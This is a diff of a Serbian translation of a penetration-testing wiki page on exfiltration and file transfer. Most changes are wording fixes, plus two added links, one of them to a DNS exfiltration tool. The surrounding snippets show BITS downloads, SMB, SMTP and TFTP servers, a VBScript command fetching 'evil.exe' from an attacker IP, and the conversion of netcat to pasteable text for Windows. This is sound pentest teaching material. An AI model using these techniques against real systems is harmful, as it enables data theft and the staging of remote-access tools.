@@ -1,10 +1,10 @@
-# Ekstrakcija
+# Ekfiltracija
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Uobičajeni dozvoljeni domeni za ekstrakciju informacija
+## Uobičajeni domeni na beloj listi za ekfiltraciju informacija
 
-Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli uobičajene dozvoljene domeine koji se mogu zloupotrebiti
+Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli uobičajene domene na beloj listi koje se mogu zloupotrebiti
 
 ## Kopiraj\&Zalepi Base64
 
@@ -42,10 +42,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload fajlova
+### Upload files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer štampanje GET i POST (takođe zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Python modul [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ili kreirajte smb deljenje **koristeći sambu**:
+Ili kreirajte smb deljenje **koristeći samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -228,7 +228,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Ako možete slati podatke na SMTP server, možete kreirati SMTP da primate podatke pomoću Pythona:
+Ako možete poslati podatke na SMTP server, možete kreirati SMTP za primanje podataka pomoću Pythona:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -236,7 +236,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 
 Podrazumevano u XP i 2003 (u drugim verzijama mora se eksplicitno dodati tokom instalacije)
 
-U Kali, **pokreni TFTP server**:
+U Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -296,14 +296,18 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb veličine**.
+Program `debug.exe` ne samo da omogućava inspekciju binarnih datoteka, već takođe ima **sposobnost da ih rekonstruiše iz heksadecimalnog formata**. To znači da pružanjem heksa binarne datoteke, `debug.exe` može generisati binarnu datoteku. Međutim, važno je napomenuti da `debug.exe` ima **ograničenje u sastavljanju datoteka do 64 kb u veličini**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Zatim kopirajte i nalepite tekst u windows-shell i biće kreiran fajl pod nazivom nc.exe.
+Zatim kopirajte i nalepite tekst u windows-shell i biće kreirana datoteka pod nazivom nc.exe.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
